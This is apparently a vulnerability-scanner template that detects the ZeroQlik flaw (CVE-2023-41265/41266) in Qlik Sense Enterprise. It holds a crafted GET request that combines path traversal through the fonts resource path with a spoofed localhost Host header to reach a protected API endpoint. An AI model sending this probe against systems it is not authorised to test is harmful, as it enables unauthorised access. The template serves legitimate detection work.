id: zeroqlik-rce
info:
  author: Adam Crosser
  name: ZeroQlik Vulnerability (CVE-2023-41265 and CVE-2023-41266)
  reference:
  - https://community.qlik.com/t5/Official-Support-Articles/Critical-Security-fixes-for-Qlik-Sense-Enterprise-for-Windows/ta-p/2110801
  - https://www.praetorian.com/blog/advisory-qlik-sense/
  - https://www.praetorian.com/blog/qlik-sense-technical-exploit
  severity: critical
requests:
- headers:
    Cookie: X-Qlik-Session=13333333-3333-3333-3333-333333333337
    Host: localhost
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
      like Gecko) Chrome/115.0.5790.110 Safari/537.36
    X-Qlik-Xrfkey: 1333333333333337
  matchers:
  - status:
    - 400
    type: status
  - part: body
    type: word
    words:
    - 'The comparison expression does not consist of three elements: .ttf'
  - part: header
    type: word
    words:
    - X-Qlik-Session
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/resources/qmc/fonts/../../../qrs/ReloadTask?xrfkey=1333333333333337&filter=.ttf'
